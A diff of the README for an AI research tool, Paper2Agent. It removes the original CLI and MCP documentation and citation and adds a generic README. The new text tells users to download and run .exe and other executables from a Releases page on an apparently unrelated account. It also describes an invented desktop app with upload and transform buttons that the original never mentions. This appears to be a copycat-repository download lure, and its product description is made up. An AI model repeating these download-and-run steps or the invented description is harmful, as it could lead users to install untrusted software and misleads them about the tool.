@@ -1,269 +1,75 @@
-<p align="center">
-  <img src="./logo/paper2agent_logo.png" alt="Paper2Agent Logo" width="600px" />
-</p>
+# 🤖 Paper2Agent - Transform Research Papers Effortlessly
 
-# Paper2Agent: Reimagining Papers As AI Agents
+[![Download Paper2Agent](https://img.shields.io/badge/Download-Paper2Agent-brightgreen)](https://github.com/mangzz12/Paper2Agent/releases)
 
-## 📖 Overview
-`Paper2Agent` is a multi-agent AI system that automatically transforms research papers into interactive AI agents with minimal human input. Here are some [Demos](#-demos) of the Paper2Agent-generated agent.
+## 📖 Introduction
 
-## 🚀 Quick Start 
+Paper2Agent is a multi-agent AI system that automatically transforms research papers into interactive AI agents with minimal human input. This tool allows you to convert dense academic texts into more accessible and usable formats. It is designed for anyone who wants to make research more interactive and engaging.
 
-### Basic Usage
-Automatically detects and runs all relevant tutorials from a research paper’s codebase.
+## 🚀 Getting Started
 
-> **⚠️ Prerequisites**: Complete the [installation & setup](#️-installation--setup) below before running Paper2Agent.
->
-> **⏱️ Runtime & Cost**: Processing time varies from 30 minutes to 3+ hours based on codebase complexity. Estimated cost: ~$15 for complex repositories like AlphaGenome using Claude Sonnet 4 (one-time cost).
+To get started with Paper2Agent, you need to download the application from our Releases page. Follow the steps below to ensure a smooth installation process.
 
-```bash
-cd Paper2Agent
+## 📥 Download & Install
 
-bash Paper2Agent.sh \
-  --project_dir <PROJECT_DIR> \
-  --github_url <GITHUB_URL>
-```
+1. **Visit the Release Page**: Click the following link to go to the Releases page: [Download Paper2Agent](https://github.com/mangzz12/Paper2Agent/releases).
+  
+2. **Choose the Latest Release**: On the Releases page, find the latest version of Paper2Agent. You will see a list of files available for download.
 
-### Advanced Usage
+3. **Download the Version for Your System**: 
+   - If you are using Windows, download the file labeled for Windows (usually ends in `.exe`).
+   - If you are using macOS, look for the file labeled for macOS.
+   - For Linux, select the appropriate file format for your distribution.
 
-#### Targeted Tutorial Processing
-Process only specific tutorials by title or URL:
+4. **Install the Application**:
+   - For Windows:
+     - Locate the downloaded file in your Downloads folder.
+     - Double-click the `.exe` file to start the installation.
+     - Follow the prompts to complete the installation.
+   - For macOS:
+     - Find the downloaded file, typically in your Downloads folder.
+     - Drag the application to your Applications folder.
+     - Open the application from the Applications folder.
+   - For Linux:
+     - Open your terminal and navigate to the location of the downloaded file.
+     - Use the command `chmod +x <filename>` to make it executable, replacing `<filename>` with the actual file name.
+     - Then run the command `./<filename>` to open the application.
 
-```bash
-bash Paper2Agent.sh \
-  --project_dir <PROJECT_DIR> \
-  --github_url <GITHUB_URL> \
-  --tutorials <TUTORIALS_URL or TUTORIALS_TITLE>
-```
+5. **Launching Paper2Agent**: After installation, you can find Paper2Agent:
+   - On Windows, you will find it in the Start Menu.
+   - On macOS, you can search for it using Spotlight or find it in the Applications folder.
+   - On Linux, you can launch it from the terminal or your application menu.
 
-#### Repository with API Key
-For repositories requiring authentication:
+## 🛠️ System Requirements
 
-```bash
-bash Paper2Agent.sh \
-  --project_dir <PROJECT_DIR> \
-  --github_url <GITHUB_URL> \
-  --api <API_KEY>
-```
+To run Paper2Agent smoothly, ensure your system meets the following requirements:
 
-### Parameters
+- **Windows**: Windows 10 or later, 4GB RAM, 200MB free disk space.
+- **macOS**: macOS version Mojave (10.14) or later, 4GB RAM, 200MB free disk space.
+- **Linux**: Ubuntu 18.04 or later, 4GB RAM, 200MB free disk space.
 
-**Required:**
-- `--project_dir <directory>`: Name of the project directory to create
-  - Example: `TISSUE_Agent`
-- `--github_url <url>`: GitHub repository URL to analyze
-  - Example: `https://github.com/sunericd/TISSUE`
+## 📚 How to Use Paper2Agent
 
-**Optional:**
-- `--tutorials <filter>`: Filter tutorials by title or URL
-  - Example: `"Preprocessing and clustering"` or tutorial URL
-- `--api <key>`: API key for repositories requiring authentication
-  - Example: `your_api_key_here`
+1. **Open the Application**: Launch Paper2Agent from your system.
+2. **Upload a Research Paper**: Click the "Upload" button and select the research paper you want to transform.
+3. **Configure Settings**: Adjust any settings as required. You can choose the output format and the level of interactivity.
+4. **Transform the Paper**: Click the "Transform" button. The software will process the paper and create an interactive AI agent.
+5. **Interact with Your AI Agent**: Once the transformation is complete, you can start interacting with the AI agent. Ask questions and explore the research in a new way.
 
-### Examples
+## 🔄 Tips for Best Results
 
-#### TISSUE Agent
-Create an AI agent from the [TISSUE](https://github.com/sunericd/TISSUE) research paper codebase for uncertainty-calibrated single-cell spatial transcriptomics analysis:
+- **Use Clear Research Papers**: For better transformations, upload papers that are clear and well-structured.
+- **Experiment with Settings**: Try different settings to see how they affect the output. Different research topics might yield various results.
+- **Feedback**: Your feedback is crucial. If you encounter issues or have suggestions for improvement, please share them on our GitHub page.
 
-```bash
-bash Paper2Agent.sh \
-  --project_dir TISSUE_Agent \
-  --github_url https://github.com/sunericd/TISSUE
-```
+## 🔗 Further Information
 
-#### Scanpy Agent for Preprocessing and Clustering
-Create an AI agent from the [Scanpy](https://github.com/scverse/scanpy) research paper codebase for single-cell analysis preprocessing and clustering:
+You can find more resources and documentation about Paper2Agent in the wiki section of our repository. This includes advanced usage, troubleshooting tips, and community-contributed content.
 
-```bash
-# Filter by tutorial title
-bash Paper2Agent.sh \
-  --project_dir Scanpy_Agent \
-  --github_url https://github.com/scverse/scanpy \
-  --tutorials "Preprocessing and clustering"
+For additional support, feel free to check our FAQ or contact us through GitHub issues or discussions.
 
-# Filter by tutorial URL
-bash Paper2Agent.sh \
-  --project_dir Scanpy_Agent \
-  --github_url https://github.com/scverse/scanpy \
-  --tutorials "https://github.com/scverse/scanpy/blob/main/docs/tutorials/basics/clustering.ipynb"
-```
+## 📞 Contact Information
 
-#### AlphaGenome Agent
-Create an AI agent from the [AlphaGenome](https://github.com/google-deepmind/alphagenome) research paper codebase for genomic data interpretation:
+If you have any questions, please reach out via the repository's Issues section. We appreciate your input and aim to assist you wherever possible.
 
-```bash
-bash Paper2Agent.sh \
-  --project_dir AlphaGenome_Agent \
-  --github_url https://github.com/google-deepmind/alphagenome \
-  --api <ALPHAGENOME_API_KEY>
-```
-
-## ⚙️ Installation & Setup
-
-### Prerequisites
-- **Python**: Version 3.10 or higher
-- **Claude Code**: Install following instructions at [anthropic.com/claude-code](https://www.anthropic.com/claude-code)
-
-### Installation Steps
-1. **Clone the Paper2Agent Repository**
-   ```bash
-   git clone https://github.com/jmiao24/Paper2Agent.git
-   cd Paper2Agent
-   ```
-
-2. **Install Python Dependencies**
-   ```bash
-   pip install fastmcp
-   ```
-
-3. **Install and Configure Claude Code**
-   ```bash
-   npm install -g @anthropic-ai/claude-code
-   claude
-   ```
-
-## 🤖 How to Create a Paper Agent?
-To streamline usage, we recommend creating Paper Agents by connecting Paper MCP servers to an AI coding agent, such as [Claude Code](https://www.anthropic.com/claude-code) or the [Google Gemini CLI](https://google-gemini.github.io/gemini-cli/) (it's free with a Google account!).
-We are also actively developing our own base agent, which will be released soon.
-
-### Automatic Launch
-After pipeline completion, Claude Code will automatically open with your new MCP server loaded.
-
-### Manual Launch with Local MCP Server
-To restart your agent later:
-```bash
-cd <working_dir>
-fastmcp install claude-code <project_dir>/src/<repo_name>_mcp.py \
---python <project_dir>/<repo_name>-env/bin/python
-```
-
-### Manual Launch with Remote MCP Server Hosted on Hugging Face
-To create a paper agent in Claude Code with the Paper MCP server of interest, use the following script with your own working directory, MCP name, and server URL:
-```bash
-bash launch_remote_mcp.sh \
-  --working_dir <working_dir> \
-  --mcp_name <mcp_name> \
-  --mcp_url <remote_mcp_url>
-```
-
-For example, to create an AlphaGenome Agent, run:
-```bash
-bash launch_remote_mcp.sh \
-  --working_dir analysis_dir \
-  --mcp_name alphagenome \
-  --mcp_url https://Paper2Agent-alphagenome-mcp.hf.space
-```
-
-✅ You will now have an **AlphaGenome Agent** ready for genomics data interpretation. You can input the query like:
-```
-Analyze heart gene expression data with AlphaGenome MCP to identify the causal gene
-for the variant chr11:116837649:T>G, associated with Hypoalphalipoproteinemia.
-```
-
-To reuse the AlphaGenome agent, run
-
-```bash
-cd analysis_dir
-claude
-```
-
-### Verification
-Verify your agent is loaded:
-```bash
-claude mcp list
-```
-
-or use `\mcp` inside Claude Code. You should see your repository-specific MCP server listed.
-<img width="620" height="247" alt="Screenshot 2025-09-15 at 10 36 00 PM" src="https://github.com/user-attachments/assets/e9bc771f-d223-477c-953b-f30220e37633" />
-
-## 📁 Output Structure
-
-After completion, your project will contain:
-
-```
-<project_dir>/
-├── src/
-│   ├── <repo_name>_mcp.py          # Generated MCP server
-│   └── tools/
-│       └── <tutorial_file_name>.py      # Extracted tools from each tutorial
-├── <repo_name>-env/                # Isolated Python environment
-├── repo/
-│   └── <repo_name>/                # Cloned repository with original code
-├── claude_outputs/
-│   ├── step1_output.json           # Tutorial scanner results
-│   ├── step2_output.json           # Tutorial executor results
-│   ├── step3_output.json           # Tool extraction results
-│   └── step4_output.json           # MCP server creation results
-├── reports/
-│   ├── tutorial-scanner.json       # Tutorial discovery analysis
-│   ├── tutorial-scanner-include-in-tools.json  # Tools inclusion decisions
-│   ├── executed_notebooks.json     # Notebook execution summary
-│   └── environment-manager_results.md  # Environment setup details
-├── tests/
-│   ├── code/<tutorial_file_name>/       # Test code for extracted tools
-│   ├── data/<tutorial_file_name>/       # Test data files
-│   ├── results/<tutorial_file_name>/    # Test execution results
-│   └── logs/                       # Test execution logs
-├── notebooks/
-│   └── <tutorial_file_name>/
-│       ├── <tutorial_file_name>_execution_final.ipynb  # Executed tutorial
-│       └── images/                 # Generated plots and visualizations
-└── tools/                          # Additional utility scripts
-```
-
-### Key Output Files and Directories
-
-| File/Directory | Description |
-|----------------|-------------|
-| `src/<repo_name>_mcp.py` | Main MCP server file that Claude Code loads |
-| `src/tools/<tutorial_file_name>.py` | Individual tool modules extracted from each tutorial |
-| `<repo_name>-env/` | Isolated Python environment with all dependencies |
-
-## 🎬 Demos
-Below, we showcase demos of AI agents created by Paper2Agent, illustrating how each agent applies the tools from its source paper to tackle scientific tasks.
-### 🧬 AlphaGenome Agent for Genomic Data Interpretation
-Example query:
-```
-Analyze heart gene expression data with AlphaGenome MCP to identify the causal gene
-for the variant chr11:116837649:T>G, associated with Hypoalphalipoproteinemia.
-```
-
-https://github.com/user-attachments/assets/34aad25b-42b3-4feb-b418-db31066e7f7b
-
-### 🗺️ TISSUE Agent for Uncertainty-Aware Spatial Transcriptomics Analysis
-Example query:
-```
-Calculate the 95% prediction interval for the spatial gene expression prediction of gene Acta2 using TISSUE MCP.
-
-This is my data:
-Spatial count matrix: Spatial_count.txt
-Spatial locations: Locations.txt
-scRNA-seq count matrix: scRNA_count.txt
-```
-
-https://github.com/user-attachments/assets/2c8f6368-fa99-4e6e-b7b5-acc12f741655
-
-### 🧫 Scanpy Agent for Single-Cell Data Preprocessing
-Example query:
-```
-Use Scanpy MCP to preprocess and cluster the single-cell dataset pbmc_all.h5ad.
-```
-
-## 🔗 Connectable Paper MCP Servers
-* AlphaGenome: https://Paper2Agent-alphagenome-mcp.hf.space
-* Scanpy: https://Paper2Agent-scanpy-mcp.hf.space
-* TISSUE: https://Paper2Agent-tissue-mcp.hf.space
-
-## 📚 Citation
-```
-@misc{miao2025paper2agent,
-      title={Paper2Agent: Reimagining Research Papers As Interactive and Reliable AI Agents}, 
-      author={Jiacheng Miao and Joe R. Davis and Jonathan K. Pritchard and James Zou},
-      year={2025},
-      eprint={2509.06917},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2509.06917}, 
-}
-```
-
+Happy transforming! Enjoy using Paper2Agent to make your academic endeavors more interactive!
